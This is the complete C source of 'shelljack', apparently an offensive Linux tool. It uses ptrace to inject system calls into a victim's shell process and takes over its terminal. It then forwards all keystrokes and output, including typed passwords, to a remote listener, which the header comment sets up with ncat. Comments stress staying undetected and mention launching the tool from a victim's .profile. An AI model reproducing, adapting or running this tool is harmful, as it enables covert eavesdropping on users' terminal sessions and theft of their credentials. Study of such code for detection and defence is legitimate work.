
/*
 *  shelljack 
 *    
 *  emptymonkey's mitm terminal sniffer
 *    
 *  2012-12-24
 *
 *  xterm / bash example:
 *    (state of xterm before the attack.)
 *    xterm(/dev/ptmx)  ---0--> bash(/dev/pts/x)
 *    xterm(/dev/ptmx)  <--1--- bash(/dev/pts/x)
 *    xterm(/dev/ptmx)  <--2--- bash(/dev/pts/x)
 *    xterm(/dev/ptmx)  <-255-> bash(/dev/pts/x)
 *
 *		(the attacker sets up a listener.)
 *		empty@monkey:~$ while [ 1 ]; do ncat -l localhost 9999; done
 *
 *		(the attacker targets the xterm process, manually in this example.)
 *		empty@monkey:~$ shelljack localhost:9999 `pgrep xterm`
 *
 *    (state of xterm after the attack.)
 *    xterm(/dev/ptmx)  <--0--> shelljack(/dev/pts/x)
 *    shelljack(/dev/ptmx)    ---0--> bash(/dev/pts/y)
 *    shelljack(/dev/ptmx)    <--1--- bash(/dev/pts/y)
 *    shelljack(/dev/ptmx)    <--2--- bash(/dev/pts/y)
 *    shelljack(/dev/ptmx)    <-255-> bash(/dev/pts/y)
 *
 *	The target process should be a session leader w/out any children.
 *	E.g. a users interactive shell. 
 *
 *  Developed with:
 *    gcc -std=gnu99 -Wall -Wextra -pedantic 
 *    gcc --version: gcc (Debian 4.4.5-8) 4.4.5
 *    Linux 3.2.0-0.bpo.2-amd64 #1 SMP
 *      Mon May 28 15:35:15 UTC 2012 x86_64 GNU/Linux
 *
 *	This code uses Linux ptrace to pass x86-64 system calls into the target.
 *	Nothing here is portable, not even a little bit.
 *
 */

#define _GNU_SOURCE


#include <errno.h>
#include <error.h>
#include <limits.h>
#include <netdb.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <syscall.h>
#include <termios.h>
#include <unistd.h>

#include <arpa/inet.h>

#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>

#include "libptrace_do.h"
#include "libctty.h"


char *CALLING_CARD = "@emptymonkey - https://github.com/emptymonkey";


#define LOCAL_BUFFER_LEN 64
#define READLINE_BUFFER_LEN	256

#define ATTATCH_DELAY 1


volatile sig_atomic_t sig_found = 0;


void usage();
void sig_handler(int signal);


void usage(){
	fprintf(stderr, "usage: %s LISTENER:PORT PID\n", program_invocation_short_name);
	fprintf(stderr, "\tLISTENER:\tHostname or IP address of the listener.\n");
	fprintf(stderr, "\tPORT:\tPort number that the listener will be listening on.\n");
	fprintf(stderr, "\tPID:\tProcess ID of the target process.\n");
	exit(-1);
}


void signal_handler(int signal){
	sig_found = signal;
}


int main(int argc, char **argv){

	int i, retval;
	int tmp_fd, fd_max;
	int ptrace_error;
	int original_tty_fd, new_tty_fd;
	int bytes_read;
	int tmp_flag;
	int current_sig;
	int target_pid;
	int target_fd_count, *target_fds = NULL;
	int fcntl_flags;

	char *argv_index;	
	char scratch[LOCAL_BUFFER_LEN];
	char *remote_scratch = NULL;
	char char_read;
	char *tmp_ptr;
	char *tty_name;

	struct addrinfo addrinfo_hint, *addrinfo_result, *addrinfo_ptr;
	struct ptrace_do *target;
	struct termios saved_termios_attrs, new_termios_attrs;
	struct sockaddr sa;
	struct sigaction act, oldact;
	struct winsize argp;

	struct stat tty_info;

	socklen_t sa_len;
	fd_set fd_select;
	pid_t sig_pid;
	
	void *remote_addr;

	struct rlimit fd_limit;

	if(argc != 3){
		usage();
	}

	if(((argv_index = index(argv[1], ':')) == NULL)){
		usage();
	}
	*argv_index = '\0';
	argv_index++;

	if(!(target_pid = strtol(argv[2], NULL, 10))){
		usage();
	}

	/*
	 * We're going to mess around with hijacking the tty for a login shell. SIGHUP is a certainty.
	 */
	signal(SIGHUP, SIG_IGN);

	/*
	 *	We aren't *really* a daemon, because we will end up with a controlling tty.
	 *	However, we will act daemon-like otherwise. Lets do those daemon-like things now.
	 */

	umask(0);

	if((retval = fork()) == -1){
		error(-1, errno, "fork()");
	}

	if(retval){
		return(0);
	}

	if((int) (retval = setsid()) == -1){
		error(-1, errno, "setsid()");
	}

	if((retval = chdir("/")) == -1){
		error(-1, errno, "chdir(\"/\")");
	}

	if((retval = getrlimit(RLIMIT_NOFILE, &fd_limit))){
		error(-1, errno, "getrlimie(RLIMIT_NOFILE, %lx)", (unsigned long) &fd_limit);
	}

	
	// Lets close any file descriptors we may have inherited.
	for(i = 0; i < (int) fd_limit.rlim_max; i++){
		if(i != STDERR_FILENO){
			close(i);
		}
	}


	/*************************************************************
	 * Connect to the listener and set up stdout and stderr
	 *************************************************************/

	memset(&addrinfo_hint, 0, sizeof(struct addrinfo));
	addrinfo_hint.ai_family = AF_UNSPEC;
	addrinfo_hint.ai_socktype = SOCK_STREAM;

	if((retval = getaddrinfo(argv[1], argv_index, &addrinfo_hint, &addrinfo_result))){
		error(-1, 0, "getaddrinfo(%s, %s, %d, %lx): %s", \
				argv[1], argv_index, 0, (unsigned long) &addrinfo_result, gai_strerror(retval));
	}

	for(addrinfo_ptr = addrinfo_result; addrinfo_ptr != NULL; addrinfo_ptr = addrinfo_ptr->ai_next){

		if((tmp_fd = socket(addrinfo_ptr->ai_family, addrinfo_ptr->ai_socktype, addrinfo_ptr->ai_protocol)) == -1){
			continue;
		}

		if((retval = connect(tmp_fd, addrinfo_ptr->ai_addr, addrinfo_ptr->ai_addrlen)) != -1){
			break;
		}

		close(tmp_fd);
	}

	if(addrinfo_ptr == NULL){
		error(-1, 0, "Unable to connect to %s:%s. Quiting.", argv[1], argv_index);
	}

	/*
	 * We will set the socket non-blocking. If the connection dies, the remote 
	 * write() shouldn't block or cause an exit(). We *may* lose data, but not being
	 * detected is the priority here.
	 */
	if((fcntl_flags = fcntl(tmp_fd, F_GETFL, 0)) == -1){
		error(-1, errno, "fcntl(%d, FGETFL, 0)", tmp_fd);
	}

	fcntl_flags |= O_NONBLOCK;
	if((retval = fcntl(tmp_fd, F_SETFL, fcntl_flags)) == -1){
		error(-1, errno, "fcntl(%d, FSETFL, %d)", tmp_fd, fcntl_flags);
	}

	if((retval = close(STDERR_FILENO)) == -1){
		error(-1, errno, "close(%d)", STDERR_FILENO);
	}

	if((retval = dup2(tmp_fd, STDERR_FILENO)) == -1){
		error(-1, errno, "dup2(%d, %d)", tmp_fd, STDERR_FILENO);
	}

	if((retval = dup2(tmp_fd, STDOUT_FILENO)) == -1){
		error(-1, errno, "dup2(%d, %d)", tmp_fd, STDOUT_FILENO);
	}


	/*
	 * This helps with a race condition if being launched out of the target's .profile in order 
	 * to attack the login shell. Apparently, bash sources the .profile *before* it configures the tty.
	 */
	sleep(ATTATCH_DELAY);

	/***************************************
	 * Print out some initialization data. *
	 ***************************************/

	memset(scratch, 0, LOCAL_BUFFER_LEN);
	if((retval = gethostname(scratch, LOCAL_BUFFER_LEN)) == -1){
		error(-1, errno, "gethostname(%lx, %d)", (unsigned long) scratch, LOCAL_BUFFER_LEN);
	}

	printf("################################\n");
	printf("# hostname: %s\n", scratch);

	memset(&sa, 0, sizeof(sa));
	sa_len = sizeof(sa);
	if((retval = getsockname(tmp_fd, &sa, &sa_len)) == -1){
		error(-1, errno, "getsockname(%d, %lx, %lx)", tmp_fd, (unsigned long) &sa, (unsigned long) &sa_len);
	}

	memset(scratch, 0, LOCAL_BUFFER_LEN);
	switch(addrinfo_ptr->ai_family){
		case AF_INET:
			if(inet_ntop(addrinfo_ptr->ai_family, &(((struct sockaddr_in *) &sa)->sin_addr), scratch, LOCAL_BUFFER_LEN) == NULL){
				error(-1, errno, "inet_ntop(%d, %lx, %lx, %d)", addrinfo_ptr->ai_family, (unsigned long) &(sa.sa_data), (unsigned long) scratch, LOCAL_BUFFER_LEN);
			}
			break;

		case AF_INET6:
			if(inet_ntop(addrinfo_ptr->ai_family, &(((struct sockaddr_in6 *) &sa)->sin6_addr), scratch, LOCAL_BUFFER_LEN) == NULL){
				error(-1, errno, "inet_ntop(%d, %lx, %lx, %d)", addrinfo_ptr->ai_family, (unsigned long) &(sa.sa_data), (unsigned long) scratch, LOCAL_BUFFER_LEN);
			}
			break;

		default:
			error(-1, 0, "unknown ai_family: %d\n", addrinfo_ptr->ai_family);
	}
	printf("# ip address: %s\n", scratch);

	printf("# username: %s\n", getenv("LOGNAME"));

	printf("################################\n");
	fflush(stdout);

	if((retval = close(tmp_fd)) == -1){
		error(-1, errno, "close(%d)", tmp_fd);
	}

	freeaddrinfo(addrinfo_result);


	/**************************************
	 * Open the original tty for our use. *
	 **************************************/
	if((tty_name = ctty_get_name(target_pid)) == NULL){
		error(-1, errno, "ctty_get_name(%d)", target_pid);
	}

	if((target_fd_count = ctty_get_fds(target_pid, tty_name, &target_fds)) == -1){
		error(-1, errno, "ctty_get_fds(%d, %s, %lx)", target_pid, tty_name, (unsigned long) &target_fds);
	}

	if((original_tty_fd = open(tty_name, O_RDWR|O_NOCTTY)) == -1){
		error(-1, errno, "open(%s, %d)", tty_name, O_RDWR);
	}

	if((retval = fstat(original_tty_fd, &tty_info)) == -1){
		error(-1, errno, "fstat(%d, %lx)", original_tty_fd, (unsigned long) &tty_info);
	}

	if((retval = tcgetattr(original_tty_fd, &saved_termios_attrs)) == -1){
		error(-1, errno, "tcgetattr(%d, %lx)", original_tty_fd, (unsigned long) &saved_termios_attrs);
	}


	/******************************
	 * Setup our master terminal. *
	 ******************************/

	if((new_tty_fd = posix_openpt(O_RDWR)) == -1){
		error(-1, errno, "posix_openpt(%d)", O_RDWR);
	}

	if(grantpt(new_tty_fd)){
		error(-1, errno, "grantpt(%d)", new_tty_fd);
	}

	if(unlockpt(new_tty_fd)){
		error(-1, errno, "unlockpt(%d)", new_tty_fd);
	}

	if((retval = tcsetattr(new_tty_fd, TCSANOW, &saved_termios_attrs)) == -1){
		error(-1, errno, "tcgetattr(%d, %lx)", new_tty_fd, (unsigned long) &saved_termios_attrs);
	}


	/***************************************************************************
	 * Hook into the target process and mangle the target's fds appropriately. *
	 ***************************************************************************/
	ptrace_error = 0;
	if((target = ptrace_do_init(target_pid)) == NULL){
		error(0, errno, "ptrace_do_init(%d)", target_pid);

		ptrace_error = 1;
		goto CLEAN_UP;
	}	

	for(i = 0; i < target_fd_count; i++){
		if(!i){

			/*
			 * Quoted from linux/drivers/tty/tty_io.c (kernel source), regarding disassociate_ctty():
			 *  It performs the following functions:
			 *  (1)  Sends a SIGHUP and SIGCONT to the foreground process group
			 *  (2)  Clears the tty from being controlling the session
			 *  (3)  Clears the controlling tty for all processes in the
			 *    session group.
			 */
			ptrace_do_sig_ignore(target, SIGHUP);
			ptrace_do_sig_ignore(target, SIGCONT);

			retval = (int) ptrace_do_syscall(target, __NR_ioctl, target_fds[i], TIOCNOTTY, 0, 0, 0, 0);
			if(errno){
				error(0, errno, "ptrace_do_syscall(%lx, %d, %d, %d, %d, %d, %d, %d)", \
						(unsigned long) target, __NR_ioctl, target_fds[i], TIOCNOTTY, 0, 0, 0, 0); 
				ptrace_error = 1;
				goto CLEAN_UP;
			}else if(retval < 0){
				error(0, -retval, "remote ioctl(%d, %d)", target_fds[i], TIOCNOTTY);
				ptrace_error = 1;
				goto CLEAN_UP;
			}

			/* Now set original tty as our ctty in the local context. */
			if((retval = ioctl(original_tty_fd, TIOCSCTTY, 1)) == -1){
				error(0, errno, "ioctl(%d, %d, %d)", original_tty_fd, TIOCSCTTY, 1);
				ptrace_error = 1;
				goto CLEAN_UP;
			}
		}

		retval = (int) ptrace_do_syscall(target, __NR_close, target_fds[i], 0, 0, 0, 0, 0);
		if(errno){
			error(0, errno, "ptrace_do_syscall(%lx, %d, %d, %d, %d, %d, %d, %d)", \
					(unsigned long) target, __NR_close, target_fds[i], 0, 0, 0, 0, 0);
			ptrace_error = 1;
			goto CLEAN_UP;
		}else if(retval < 0){
			error(0, -retval, "remote close(%d)", target_fds[i]);
			ptrace_error = 1;
			goto CLEAN_UP;
		}
	}

	if((remote_scratch = (char *) ptrace_do_malloc(target, READLINE_BUFFER_LEN)) == NULL){
		error(0, errno, "ptrace_do_malloc(%lx, %d)", \
				(unsigned long) target, READLINE_BUFFER_LEN);
		ptrace_error = 1;
		goto CLEAN_UP;
	}	
	memset(remote_scratch, 0, READLINE_BUFFER_LEN);

	if(!(tmp_ptr = ptsname(new_tty_fd))){
		error(-1, errno, "ptsname(%d)", new_tty_fd);
	}

	// If we are running as root, make sure to chmod the new tty to the match the old one.
	if(!getuid()){
		if((retval = chown(tmp_ptr, tty_info.st_uid, -1)) == -1){
			error(-1, errno, "chown(%s, %d, %d)", tmp_ptr, tty_info.st_uid, -1);
		}
	}

	memcpy(remote_scratch, tmp_ptr, strlen(tmp_ptr));

	if((remote_addr = ptrace_do_push_mem(target, remote_scratch)) == NULL){
		error(0, errno, "ptrace_do_push_mem(%lx, %lx)", \
				(unsigned long) target, (unsigned long) remote_scratch);
		ptrace_error = 1;
		goto CLEAN_UP;
	}

	retval = (int) ptrace_do_syscall(target, __NR_open, (unsigned long) remote_addr, O_RDWR, 0, 0, 0, 0);
	if(errno){
		error(0, errno, "ptrace_do_syscall(%lx, %d, %lx, %d, %d, %d, %d, %d)", \
				(unsigned long) target, __NR_open, (unsigned long) remote_addr, O_RDWR, 0, 0, 0, 0);
		ptrace_error = 1;
		goto CLEAN_UP;
	}else if(retval < 0){
		error(0, -retval, "remote open(%lx, %d)", (unsigned long) remote_addr, O_RDWR);
		ptrace_error = 1;
		goto CLEAN_UP;
	}
	tmp_fd = retval;

	tmp_flag = 0;
	for(i = 0; i < target_fd_count; i++){

		if(target_fds[i] == tmp_fd){
			tmp_flag = 1;
		}else{

			retval = (int) ptrace_do_syscall(target, __NR_dup2, tmp_fd, target_fds[i], 0, 0, 0, 0);
			if(errno){
				error(0, errno, "ptrace_do_syscall(%lx, %d, %d, %d, %d, %d, %d, %d)", \
						(unsigned long) target, __NR_dup2, tmp_fd, target_fds[i], 0, 0, 0, 0);
				ptrace_error = 1;
				goto CLEAN_UP;
			}else if(retval < 0){
				error(0, -retval, "remote dup2(%d, %d)", tmp_fd, target_fds[i]);
				ptrace_error = 1;
				goto CLEAN_UP;
			}
		}
	}

	if(!tmp_flag){
		retval = (int) ptrace_do_syscall(target, __NR_close, tmp_fd, 0, 0, 0, 0, 0);
		if(errno){
			error(0, errno, "ptrace_do_syscall(%lx, %d, %d, %d, %d, %d, %d, %d)", \
					(unsigned long) target, __NR_close, tmp_fd, 0, 0, 0, 0, 0);
			ptrace_error = 1;
			goto CLEAN_UP;
		}else if(retval < 0){
			error(0, -retval, "remote close(%d)", tmp_fd);
			ptrace_error = 1;
			goto CLEAN_UP;
		}
	}


CLEAN_UP:
	ptrace_do_cleanup(target);

	if(ptrace_error){
		error(-1, 0, "Fatal error from ptrace_do. Quitting.");
	}


	/**************************************************
	 * Set the original tty to raw mode.
	 **************************************************/
	memcpy(&new_termios_attrs, &saved_termios_attrs, sizeof(struct termios));

	new_termios_attrs.c_lflag &= ~(ECHO|ICANON|IEXTEN|ISIG);
	new_termios_attrs.c_iflag &= ~(BRKINT|ICRNL|INPCK|ISTRIP|IXON);
	new_termios_attrs.c_cflag &= ~(CSIZE|PARENB);
	new_termios_attrs.c_cflag |= CS8;
	new_termios_attrs.c_oflag &= ~(OPOST);

	new_termios_attrs.c_cc[VMIN] = 1;
	new_termios_attrs.c_cc[VTIME] = 0;

	if((retval = tcsetattr(original_tty_fd, TCSANOW, &new_termios_attrs)) == -1){
		error(-1, errno, "tcsetattr(%d, TCSANOW, %lx)", \
				original_tty_fd, (unsigned long) &new_termios_attrs);
	}


	/**************************************************
	 * Set the signals for appropriate mitm handling. *
	 **************************************************/

	memset(&act, 0, sizeof(act));
	memset(&oldact, 0, sizeof(oldact));
	act.sa_handler = signal_handler;

	if((retval = sigaction(SIGHUP, &act, &oldact)) == -1){
		error(-1, errno, "sigaction(%d, %lx, %lx)", SIGHUP, (unsigned long) &act, (unsigned long) &oldact);
	}
	if((retval = sigaction(SIGINT, &act, NULL)) == -1){
		error(-1, errno, "sigaction(%d, %lx, %p)", SIGINT, (unsigned long) &act, NULL);
	}
	if((retval = sigaction(SIGQUIT, &act, NULL)) == -1){
		error(-1, errno, "sigaction(%d, %lx, %p)", SIGQUIT, (unsigned long) &act, NULL);
	}
	if((retval = sigaction(SIGTSTP, &act, NULL)) == -1){
		error(-1, errno, "sigaction(%d, %lx, %p)", SIGTSTP, (unsigned long) &act, NULL);
	}
	if((retval = sigaction(SIGWINCH, &act, NULL)) == -1){
		error(-1, errno, "sigaction(%d, %lx, %p)", SIGWINCH, (unsigned long) &act, NULL);
	}

	/*
	 *	The current TIOCGWINSZ for the new terminal will be incorrect at this point.
	 *	Lets force an initial SIGWINCH to ensure it gets set appropriately.
	 */
	if((retval = ioctl(original_tty_fd, TIOCGWINSZ, &argp)) == -1){
		error(-1, errno, "ioctl(%d, %d, %lx)", original_tty_fd, TIOCGWINSZ, (unsigned long) &argp);
	}

	if((retval = ioctl(new_tty_fd, TIOCSWINSZ, &argp)) == -1){
		error(-1, errno, "ioctl(%d, %d, %lx)", original_tty_fd, TIOCGWINSZ, (unsigned long) &argp);
	}

	if((sig_pid = tcgetsid(new_tty_fd)) == -1){
		error(-1, errno, "tcgetsid(%d)", new_tty_fd);
	}

	if((retval = kill(-sig_pid, SIGWINCH)) == -1){
		error(-1, errno, "kill(%d, %d)", -sig_pid, SIGWINCH);
	}


	/****************************** 
	 * Mitm the terminal traffic. *
	 ******************************/

	fd_max = (new_tty_fd > original_tty_fd) ? new_tty_fd : original_tty_fd;
	char_read = '\r';

	while(1){
		FD_ZERO(&fd_select);
		FD_SET(new_tty_fd, &fd_select);
		FD_SET(original_tty_fd, &fd_select);

		if(((retval = select(fd_max + 1, &fd_select, NULL, NULL, NULL)) == -1) && !sig_found){
			error(-1, errno, "select(%d, %lx, %p, %p, %p)", \
					fd_max + 1, (unsigned long) &fd_select, NULL, NULL, NULL);
		}

		if(sig_found){

			/* Minimize the risk of more signals being delivered while we are already handling signals. */
			current_sig = sig_found;
			sig_found = 0;

			switch(current_sig){

				/*
				 * Signals we want to handle:
				 *	SIGHUP -> Send SIGHUP to the target session, restore our SIGHUP to default, then resend to ourselves.
				 *	SIGINT -> Send SIGINT to the current target foreground job.
				 *	SIGQUIT -> Send SIGQUIT to the current target foreground job.
				 *	SIGTSTP -> Send SIGTSTP to the current target foreground job.
				 *	SIGWINCH -> Grab TIOCGWINSZ from old tty. Set TIOCSWINSZ for new tty. Send SIGWINCH to the current target session.
				 */
				case SIGHUP:

					if((sig_pid = tcgetsid(new_tty_fd)) != -1){
						if((retval = kill(-sig_pid, current_sig)) == -1){
							error(-1, errno, "kill(%d, %d)", -sig_pid, current_sig);
						}
					}

					if((retval = sigaction(current_sig, &oldact, NULL)) == -1){
						error(-1, errno, "sigaction(%d, %lx, %p)", current_sig, (unsigned long) &oldact, NULL);
					}

					if((retval = raise(current_sig)) != 0){
						error(-1, errno, "raise(%d)", current_sig);
					}
					break;

				case SIGINT:
				case SIGQUIT:
				case SIGTSTP:

					if((sig_pid = tcgetpgrp(new_tty_fd)) == -1){
						error(-1, errno, "tcgetpgrp(%d)", new_tty_fd);
					}

					if((retval = kill(-sig_pid, current_sig)) == -1){
						error(-1, errno, "kill(%d, %d)", sig_pid, current_sig);
					}
					break;

				case SIGWINCH: 
					if((retval = ioctl(original_tty_fd, TIOCGWINSZ, &argp)) == -1){
						error(-1, errno, "ioctl(%d, %d, %lx)", original_tty_fd, TIOCGWINSZ, (unsigned long) &argp);
					}

					if((retval = ioctl(new_tty_fd, TIOCSWINSZ, &argp)) == -1){
						error(-1, errno, "ioctl(%d, %d, %lx)", original_tty_fd, TIOCSWINSZ, (unsigned long) &argp);
					}

					if((sig_pid = tcgetsid(new_tty_fd)) == -1){
						error(-1, errno, "tcgetsid(%d)", new_tty_fd);
					}

					if((retval = kill(-sig_pid, current_sig)) == -1){
						error(-1, errno, "kill(%d, %d)", -sig_pid, current_sig);
					}
					break;

				default:
					error(0, 0, "Undefined signal found: %d", current_sig);
					break;
			}

			current_sig = 0;

			/*
			 * From here on out, we pass chars back and forth, while copying them off
			 * to the remote listener. The "char_read" hack is a cheap way to watch for
			 * a "no echo" situation. (Bash keeps its own state for the tty and lies to
			 * the user about echo on vs echo off. On the back end it's always raw mode. 
			 * I suspect this is a natural result of using the GNU readline library.)
			 */
		}else if(FD_ISSET(original_tty_fd, &fd_select)){

			memset(scratch, 0, sizeof(scratch));
			if((retval = read(original_tty_fd, scratch, sizeof(scratch))) == -1){
				error(-1, errno, "read(%d, %lx, %d)", \
						original_tty_fd, (unsigned long) scratch, (int) sizeof(scratch));
			}
			bytes_read = (retval == -1) ? 0 : retval;

			if((retval = write(new_tty_fd, scratch, bytes_read)) == -1){
				error(-1, errno, "write(%d, %lx, %d)", \
						new_tty_fd, (unsigned long) scratch, bytes_read);
			}

			if(!char_read){
				if(bytes_read == 1){
					char_read = scratch[0];
				}
			}else{
				if(bytes_read == 1){
					write(STDOUT_FILENO, &char_read, 1);
					char_read = scratch[0];
				}
			}

		}else if(FD_ISSET(new_tty_fd, &fd_select)){

			char_read = '\0';
			memset(scratch, 0, sizeof(scratch));
			errno = 0;
			if(((retval = read(new_tty_fd, scratch, sizeof(scratch))) == -1) && (errno != EIO)){
				error(-1, errno, "read(%d, %lx, %d)", \
						new_tty_fd, (unsigned long) scratch, (int) sizeof(scratch));
			}else if(!retval || errno == EIO){
				exit(0);
			}
			bytes_read = (retval == -1) ? 0 : retval;

			if((retval = write(original_tty_fd, scratch, bytes_read)) == -1){
				error(-1, errno, "write(%d, %lx, %d)", \
						original_tty_fd, (unsigned long) &char_read, bytes_read);
			}

			write(STDOUT_FILENO, scratch, bytes_read);
		}
	}

	return(0);
}
